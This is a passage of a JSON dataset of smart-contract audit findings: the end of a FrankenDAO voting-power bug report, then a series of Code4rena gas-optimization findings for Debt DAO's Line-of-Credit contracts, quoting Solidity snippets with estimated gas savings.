Please double check this one, as I'm 99% confident but would love a second set of eyes on it.",
      "summary": "\nThis bug report is about an issue with the total community voting power being updated incorrectly when a user delegates. It was found by Trumpero, curiousapple, and hansfriese. The bug occurs when a user delegates their voting power from staked tokens, as the update logic is not correct, resulting in the wrong values for the total community voting power. The code snippet provided shows that when the total community voting power is increased in the first if statement, the msg.sender's token voting power might be positive already and community voting power might be added to total community voting power before. Additionally, the currentDelegate's token voting power might be still positive after delegation, so the community voting power should not be removed. This can lead to incorrect values for the total community voting power. The recommended solution is to add more conditions to check if the msg.sender delegated or not. The bug was fixed by zobront, who asked for a second set of eyes to double check the fix.",
      "quality_score": 4,
      "rarity_score": 2,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "FrankenDAO",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-frankendao-judging/issues/91",
      "tags": [
        "DAO"
      ],
      "finders": [
        "curiousapple",
        "Trumpero",
        "hansfriese"
      ]
    },
    {
      "id": "42984",
      "title": "[G-18]  Using `> 0` costs more gas than `!= 0` when used on a `uint` in a `require()` statement",
      "impact": "GAS",
      "content": "This change saves **[6 gas](https://aws1.discourse-cdn.com/business6/uploads/zeppelin/original/2X/3/363a367d6d68851f27d2679d10706cd16d788b96.png)** per instance. The optimization works until solidity version [0.8.13](https://gist.github.com/IllIllI000/bf2c3120f24a69e489f12b3213c06c94) where there is a regression in gas costs.\n\n*There are 3 instances of this issue:*\n```solidity\nFile: contracts/utils/EscrowLib.sol\n\n/// @audit (valid but excluded finding)\n91:           require(amount > 0);\n\n/// @audit (valid but excluded finding)\n161:          require(amount > 0);\n\n/// @audit (valid but excluded finding)\n198:          require(amount > 0);\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L91\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42983",
      "title": "[G-17]  Using `bool`s for storage incurs overhead",
      "impact": "GAS",
      "content": "```solidity\n    // Booleans are more expensive than uint256 or any type that takes up a full\n    // word because each write operation emits an extra SLOAD to first read the\n    // slot's contents, replace the bits taken up by the boolean, and then write\n    // back. This is the compiler's defense against contract upgrades and\n    // pointer aliasing, and it cannot be disabled.\n```\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27\nUse `uint256(1)` and `uint256(2)` for true/false to avoid a Gwarmaccess (**[100 gas](https://gist.github.com/IllIllI000/1b70014db712f8572a72378321250058)**) for the extra SLOAD, and to avoid Gsset (**20000 gas**) when changing from `false` to `true`, after having been `true` in the past\n\n*There is 1 instance of this issue:*\n```solidity\nFile: contracts/utils/MutualConsent.sol\n\n/// @audit (valid but excluded finding)\n15:       mapping(bytes32 => bool) public mutualConsents;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/MutualConsent.sol#L15\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42982",
      "title": "[G-16]  Functions guaranteed to revert when called by normal users can be marked `payable`",
      "impact": "GAS",
      "content": "\nIf a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are \n`CALLVALUE`(2),`DUP1`(3),`ISZERO`(3),`PUSH2`(3),`JUMPI`(10),`PUSH1`(3),`DUP1`(3),`REVERT`(0),`JUMPDEST`(1),`POP`(2), which costs an average of about **21 gas per call** to the function, in addition to the extra deployment cost.\n\n*There are 4 instances of this issue:*\n```solidity\nFile: contracts/modules/credit/LineOfCredit.sol\n\n340       function borrow(bytes32 id, uint256 amount)\n341           external\n342           override\n343           whileActive\n344           onlyBorrower\n345:          returns (bool)\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L340-L345\n\n```solidity\nFile: contracts/modules/credit/SecuredLine.sol\n\n48      function rollover(address newLine)\n49        external\n50        onlyBorrower\n51        override\n52:       returns(bool)\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SecuredLine.sol#L48-L52\n\n```solidity\nFile: contracts/modules/interest-rate/InterestRateCredit.sol\n\n34        function accrueInterest(\n35            bytes32 id,\n36            uint256 drawnBalance,\n37            uint256 facilityBalance\n38:       ) external override onlyLineContract returns (uint256) {\n\n74        function setRate(\n75            bytes32 id,\n76            uint128 dRate,\n77            uint128 fRate\n78:       ) external onlyLineContract returns (bool) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/interest-rate/InterestRateCredit.sol#L34-L38\n\n___\n\n## Excluded findings\nThese findings are excluded from awards calculations because there are publicly-available automated tools that find them. The valid ones appear here for completeness\n\n## Gas Optimizations Summary\n| |Issue|Instances|Total Gas Saved|\n|-|:-|:-:|:-:|\n| [G&#x2011;17] | Using `bool`s for storage incurs overhead | 1 | 17100 |\n| [G&#x2011;18] | Using `> 0` costs more gas than `!= 0` when used on a `uint` in a `require()` statement | 3 | 18 |\n\nTotal: 4 instances over 2 issues with **17118 gas** saved\n\nGas totals use lower bounds of ranges and count two iterations of each `for`-loop. All values above are runtime, not deployment, values; deployment values are listed in the individual issue descriptions. The table above as well as its gas numbers do not include any of the excluded findings.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42981",
      "title": "[G-15]  Use custom errors rather than `revert()`/`require()` strings to save gas",
      "impact": "GAS",
      "content": "\nCustom errors are available from solidity version 0.8.4. Custom errors save [**~50 gas**](https://gist.github.com/IllIllI000/ad1bd0d29a0101b25e57c293b4b0c746) each time they're hit by [avoiding having to allocate and store the revert string](https://blog.soliditylang.org/2021/04/21/custom-errors/#errors-in-depth). Not defining the strings also save deployment gas.\n\n*There is 1 instance of this issue:*\n```solidity\nFile: contracts/modules/interest-rate/InterestRateCredit.sol\n\n26            require(\n27                msg.sender == lineContract,\n28                \"InterestRateCred: only line contract.\"\n29:           );\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/interest-rate/InterestRateCredit.sol#L26-L29\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42980",
      "title": "[G-14]  `require()` or `revert()` statements that check input arguments should be at the top of the function",
      "impact": "GAS",
      "content": "\nChecks that involve constants should come before checks that involve state variables, function calls, and calculations. By doing these checks first, the function is able to revert before wasting a Gcoldsload (**2100 gas***) in a function that may ultimately revert in the unhappy case.\n\n*There is 1 instance of this issue:*\n```solidity\nFile: contracts/modules/credit/LineOfCredit.sol\n\n/// @audit expensive op on line 324\n326:          require(amount <= credit.principal + credit.interestAccrued);\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L326\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42979",
      "title": "[G-13]  Inverting the condition of an `if`-`else`-statement wastes gas",
      "impact": "GAS",
      "content": "\nFlipping the `true` and `false` blocks instead saves ***[3 gas](https://gist.github.com/IllIllI000/44da6fbe9d12b9ab21af82f14add56b9)***.\n\n*There are 2 instances of this issue:*\n```solidity\nFile: contracts/utils/CreditLib.sol\n\n145:            decimals = !passed ? 18 : abi.decode(result, (uint8));\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L145\n\n```solidity\nFile: contracts/utils/EscrowLib.sol\n\n122                   deposit.asset = !is4626\n123                       ? token\n124:                      : abi.decode(tokenAddrBytes, (address));\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L122-L124\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42978",
      "title": "[G-12]  Using `private` rather than `public` for constants, saves gas",
      "impact": "GAS",
      "content": "\nIf needed, the values can be read from the verified contract source code, or if there are multiple values there can be a single getter function that [returns a tuple](https://github.com/code-423n4/2022-08-frax/blob/90f55a9ce4e25bceed3a74290b854341d8de6afa/src/contracts/FraxlendPair.sol#L156-L178) of the values of all currently-public constants. Saves **3406-3606 gas** in deployment gas due to the compiler not having to create non-payable getter functions for deployment calldata, not having to store the bytes of the value outside of where it's used, and not adding another entry to the method ID table.\n\n*There are 3 instances of this issue:*\n```solidity\nFile: contracts/modules/credit/LineOfCredit.sol\n\n21:       uint256 public immutable deadline;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L21\n\n```solidity\nFile: contracts/modules/credit/SpigotedLine.sol\n\n32:       uint8 public immutable defaultRevenueSplit;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SpigotedLine.sol#L32\n\n```solidity\nFile: contracts/modules/escrow/Escrow.sol\n\n24:       uint32 public immutable minimumCollateralRatio;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/escrow/Escrow.sol#L24\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42977",
      "title": "[G-11]  Usage of `uints`/`ints` smaller than 32 bytes (256 bits) incurs overhead",
      "impact": "GAS",
      "content": "> When using elements that are smaller than 32 bytes, your contract’s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.\n\nhttps://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html\nEach operation involving a `uint8` costs an extra [**22-28 gas**](https://gist.github.com/IllIllI000/9388d20c70f9a4632eb3ca7836f54977) (depending on whether the other operand is also a variable of type `uint8`) as compared to ones involving `uint256`, due to the compiler having to clear the higher bits of the memory word before operating on the `uint8`, as well as the associated stack operations of doing so. Use a larger size then downcast where needed.\n\n*There are 2 instances of this issue:*\n```solidity\nFile: contracts/utils/CreditLib.sol\n\n/// @audit uint8 decimals\n140:            decimals = 18;\n\n/// @audit uint8 decimals\n145:            decimals = !passed ? 18 : abi.decode(result, (uint8));\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L140\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42976",
      "title": "[G-10]  Optimize names to save gas",
      "impact": "GAS",
      "content": "\n`public`/`external` function names and `public` member variable names can be optimized to save gas. See [this](https://gist.github.com/IllIllI000/a5d8b486a8259f9f77891a919febd1a9) link for an example of how it works. Below are the interfaces/abstract contracts that can be optimized so that the most frequently-called functions use the least amount of gas possible during method lookup. Method IDs that have two leading zero bytes can save **128 gas** each during deployment, and renaming functions to have lower method IDs will save **22 gas** per call, [per sorted position shifted](https://medium.com/joyso/solidity-how-does-function-name-affect-gas-consumption-in-smart-contract-47d270d8ac92).\n\n*There are 15 instances of this issue:*\n```solidity\nFile: contracts/modules/credit/LineOfCredit.sol\n\n/// @audit init(), healthcheck(), counts(), declareInsolvent()\n16:   contract LineOfCredit is ILineOfCredit, MutualConsent {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L16\n\n```solidity\nFile: contracts/modules/credit/SecuredLine.sol\n\n/// @audit liquidate()\n11:   contract SecuredLine is SpigotedLine, EscrowedLine, ISecuredLine {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SecuredLine.sol#L11\n\n```solidity\nFile: contracts/modules/credit/SpigotedLine.sol\n\n/// @audit unused(), claimAndRepay(), useAndRepay(), claimAndTrade(), updateOwnerSplit(), addSpigot(), updateWhitelist(), releaseSpigot(), sweep()\n22:   contract SpigotedLine is ISpigotedLine, LineOfCredit, ReentrancyGuard {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SpigotedLine.sol#L22\n\n```solidity\nFile: contracts/modules/escrow/Escrow.sol\n\n/// @audit isLiquidatable(), updateLine(), addCollateral(), enableCollateral(), releaseCollateral(), getCollateralRatio(), getCollateralValue(), liquidate()\n19:   contract Escrow is IEscrow {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/escrow/Escrow.sol#L19\n\n```solidity\nFile: contracts/modules/factories/LineFactory.sol\n\n/// @audit deployEscrow(), deploySpigot(), deploySecuredLine(), deploySecuredLineWithConfig(), deploySecuredLineWithModules(), rolloverSecuredLine()\n9:    contract LineFactory is ILineFactory {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/factories/LineFactory.sol#L9\n\n```solidity\nFile: contracts/modules/interest-rate/InterestRateCredit.sol\n\n/// @audit setRate()\n5:    contract InterestRateCredit is IInterestRateCredit {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/interest-rate/InterestRateCredit.sol#L5\n\n```solidity\nFile: contracts/modules/oracle/Oracle.sol\n\n/// @audit getLatestAnswer()\n13:   contract Oracle is IOracle {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/oracle/Oracle.sol#L13\n\n```solidity\nFile: contracts/modules/spigot/Spigot.sol\n\n/// @audit operator(), claimRevenue(), claimEscrow(), operate(), addSpigot(), removeSpigot(), updateOwnerSplit(), updateOwner(), updateOperator(), updateTreasury(), updateWhitelistedFunction(), getEscrowed(), isWhitelisted(), getSetting()\n16:   contract Spigot is ISpigot, ReentrancyGuard {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/spigot/Spigot.sol#L16\n\n```solidity\nFile: contracts/utils/CreditLib.sol\n\n/// @audit computeId(), getOutstandingDebt(), calculateValue(), create(), repay(), withdraw(), accrue()\n14:   library CreditLib {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L14\n\n```solidity\nFile: contracts/utils/CreditListLib.sol\n\n/// @audit removePosition(), stepQ()\n10:   library CreditListLib {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditListLib.sol#L10\n\n```solidity\nFile: contracts/utils/EscrowLib.sol\n\n/// @audit _getLatestCollateralRatio(), _getCollateralValue(), addCollateral(), enableCollateral(), releaseCollateral(), getCollateralRatio(), getCollateralValue(), liquidate(), isLiquidatable(), updateLine()\n21:   library EscrowLib {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L21\n\n```solidity\nFile: contracts/utils/LineFactoryLib.sol\n\n/// @audit rolloverSecuredLine(), transferModulesToLine(), deploySecuredLine()\n7:    library LineFactoryLib {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineFactoryLib.sol#L7\n\n```solidity\nFile: contracts/utils/LineLib.sol\n\n/// @audit sendOutTokenOrETH(), receiveTokenOrETH(), getBalance()\n14:   library LineLib {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineLib.sol#L14\n\n```solidity\nFile: contracts/utils/SpigotedLineLib.sol\n\n/// @audit claimAndTrade(), trade(), rollover(), canDeclareInsolvent(), updateSplit(), releaseSpigot(), sweep()\n10:   library SpigotedLineLib {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotedLineLib.sol#L10\n\n```solidity\nFile: contracts/utils/SpigotLib.sol\n\n/// @audit _claimRevenue(), operate(), claimRevenue(), claimEscrow(), addSpigot(), removeSpigot(), updateOwnerSplit(), updateOwner(), updateOperator(), updateTreasury(), updateWhitelistedFunction(), getEscrowed(), isWhitelisted(), getSetting()\n23:   library SpigotLib {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotLib.sol#L23\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42975",
      "title": "[G-09]  `require()`/`revert()` strings longer than 32 bytes cost extra gas",
      "impact": "GAS",
      "content": "\nEach extra memory word of bytes past the original 32 [incurs an MSTORE](https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#consider-having-short-revert-strings) which costs **3 gas**.\n\n*There is 1 instance of this issue:*\n```solidity\nFile: contracts/modules/interest-rate/InterestRateCredit.sol\n\n26            require(\n27                msg.sender == lineContract,\n28                \"InterestRateCred: only line contract.\"\n29:           );\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/interest-rate/InterestRateCredit.sol#L26-L29\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42974",
      "title": "[G-08]  `++i`/`i++` should be `unchecked{++i}`/`unchecked{i++}` when it is not possible for them to overflow, as is the case when used in `for`- and `while`-loops",
      "impact": "GAS",
      "content": "\nThe `unchecked` keyword is new in solidity version 0.8.0, so this only applies to that version or higher, which these instances are. This saves **30-40 gas [per loop](https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#the-increment-in-for-loop-post-condition-can-be-made-unchecked)**.\n\n*There are 6 instances of this issue:*\n```solidity\nFile: contracts/modules/credit/LineOfCredit.sol\n\n179:          for (uint256 i; i < len; ++i) {\n\n203:          for (uint256 i; i < len; ++i) {\n\n520:          for (uint256 i; i <= lastSpot; ++i) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L179\n\n```solidity\nFile: contracts/utils/CreditListLib.sol\n\n23:         for(uint256 i; i < len; ++i) {\n\n51:           for(uint i = 1; i < len; ++i) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditListLib.sol#L23\n\n```solidity\nFile: contracts/utils/EscrowLib.sol\n\n57:           for (uint256 i; i < length; ++i) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L57\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42973",
      "title": "[G-07]  Add `unchecked {}` for subtractions where the operands cannot underflow because of a previous `require()` or `if`-statement",
      "impact": "GAS",
      "content": "`require(a <= b); x = b - a` => `require(a <= b); unchecked { x = b - a }`\n\n*There are 3 instances of this issue:*\n```solidity\nFile: contracts/modules/credit/SpigotedLine.sol\n\n/// @audit if-condition on line 120\n122:              unusedTokens[credit.token] -= repaid - newTokens;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SpigotedLine.sol#L122\n\n```solidity\nFile: contracts/utils/SpigotedLineLib.sol\n\n/// @audit if-condition on line 100\n101:            uint256 diff = oldClaimTokens - newClaimTokens;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotedLineLib.sol#L101\n\n```solidity\nFile: contracts/utils/SpigotLib.sol\n\n/// @audit if-condition on line 95\n96:               require(LineLib.sendOutTokenOrETH(token, self.treasury, claimed - escrowedAmount));\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotLib.sol#L96\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42972",
      "title": "[G-06]  `internal` functions only called once can be inlined to save gas",
      "impact": "GAS",
      "content": "\nNot inlining costs **20 to 40 gas** because of two extra `JUMP` instructions and additional stack operations needed for function calls.\n\n*There are 4 instances of this issue:*\n```solidity\nFile: contracts/modules/credit/LineOfCredit.sol\n\n167       function _updateOutstandingDebt()\n168           internal\n169:          returns (uint256 principal, uint256 interest)\n\n435       function _createCredit(\n436           address lender,\n437           address token,\n438           uint256 amount\n439       )\n440           internal\n441:          returns (bytes32 id)\n\n516:      function _sortIntoQ(bytes32 p) internal returns (bool) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L167-L169\n\n```solidity\nFile: contracts/modules/interest-rate/InterestRateCredit.sol\n\n42        function _accrueInterest(\n43            bytes32 id,\n44            uint256 drawnBalance,\n45            uint256 facilityBalance\n46:       ) internal returns (uint256) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/interest-rate/InterestRateCredit.sol#L42-L46\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42971",
      "title": "[G-05]  State variables should be cached in stack variables rather than re-reading them from storage",
      "impact": "GAS",
      "content": "\nThe instances below point to the second+ access of a state variable within a function. Caching of a state variable replaces each Gwarmaccess (**100 gas**) with a much cheaper stack read. Other less obvious fixes/optimizations include having local memory caches of state variable structs, or having local caches of state variable contracts/addresses.\n\n*There are 5 instances of this issue:*\n```solidity\nFile: contracts/modules/credit/LineOfCredit.sol\n\n/// @audit count on line 499\n502:          if (count == 0) { _updateStatus(LineLib.STATUS.REPAID); }\n\n/// @audit ids on line 172\n180:              id = ids[i];\n\n/// @audit ids on line 201\n204:            id = ids[i];\n\n/// @audit ids on line 517\n521:              id = ids[i];\n\n/// @audit ids on line 532\n532:                  ids[i] = ids[nextQSpot];    // id put into old `p` position\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L502\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42970",
      "title": "[G-04]  Avoid contract existence checks by using low level calls",
      "impact": "GAS",
      "content": "\nPrior to 0.8.10 the compiler inserted extra code, including `EXTCODESIZE` (**100 gas**), to check for contract existence for external function calls. In more recent solidity versions, the compiler will not insert these checks if the external call has a return value. Similar behavior can be achieved in earlier versions by using low-level calls, since low level calls never check for contract existence\n\n*There are 27 instances of this issue:*\n```solidity\nFile: contracts/modules/credit/SecuredLine.sol\n\n/// @audit status()\n57:       if(ILineOfCredit(newLine).status() != LineLib.STATUS.UNINITIALIZED) { revert BadNewLine(); }\n\n/// @audit init()\n63:       if(ILineOfCredit(newLine).init() != LineLib.STATUS.ACTIVE) { revert BadRollover(); }\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SecuredLine.sol#L57\n\n```solidity\nFile: contracts/utils/CreditLib.sol\n\n/// @audit getLatestAnswer()\n84:       int256 price = IOracle(oracle).getLatestAnswer(c.token);\n\n/// @audit getLatestAnswer()\n135:        int price = IOracle(oracle).getLatestAnswer(token);\n\n/// @audit accrueInterest()\n251:        uint256 accruedToken = IInterestRateCredit(interest).accrueInterest(\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L84\n\n```solidity\nFile: contracts/utils/EscrowLib.sol\n\n/// @audit updateOutstandingDebt()\n35:           (uint256 principal, uint256 interest) = ILineOfCredit(self.line).updateOutstandingDebt();\n\n/// @audit arbiter()\n105:          require(msg.sender == ILineOfCredit(self.line).arbiter());\n\n/// @audit getLatestAnswer()\n126:                  int256 price = IOracle(oracle).getLatestAnswer(deposit.asset);\n\n/// @audit status()\n173:            ILineOfCredit(self.line).status() != LineLib.STATUS.REPAID // if repaid, skip;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L35\n\n```solidity\nFile: contracts/utils/LineFactoryLib.sol\n\n/// @audit spigot()\n48:           address s = address(SecuredLine(oldLine).spigot());\n\n/// @audit escrow()\n49:           address e = address(SecuredLine(oldLine).escrow());\n\n/// @audit swapTarget()\n50:           address payable st = SecuredLine(oldLine).swapTarget();\n\n/// @audit defaultRevenueSplit()\n51:           uint8 split = SecuredLine(oldLine).defaultRevenueSplit();\n\n/// @audit init()\n72:           if(SecuredLine(payable(line)).init() != LineLib.STATUS.ACTIVE) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineFactoryLib.sol#L48\n\n```solidity\nFile: contracts/utils/LineLib.sol\n\n/// @audit safeTransfer()\n46:               IERC20(token).safeTransfer(receiver, amount);\n\n/// @audit transfer()\n48:               payable(receiver).transfer(amount);\n\n/// @audit safeTransferFrom()\n69:               IERC20(token).safeTransferFrom(sender, address(this), amount);\n\n/// @audit balanceOf()\n83:               IERC20(token).balanceOf(address(this)) :\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineLib.sol#L46\n\n```solidity\nFile: contracts/utils/SpigotedLineLib.sol\n\n/// @audit claimEscrow()\n73:           uint256 claimed = ISpigot(spigot).claimEscrow(claimToken);\n\n/// @audit approve()\n134:              IERC20(sellToken).approve(swapTarget, amount);\n\n/// @audit updateOwner()\n147:        require(ISpigot(spigot).updateOwner(newLine));\n\n/// @audit owner()\n153:        address owner_ = ISpigot(spigot).owner();\n\n/// @audit getSetting()\n170:          (uint8 split,, bytes4 transferFunc) = ISpigot(spigot).getSetting(revenueContract);\n\n/// @audit updateOwnerSplit()\n176:              return 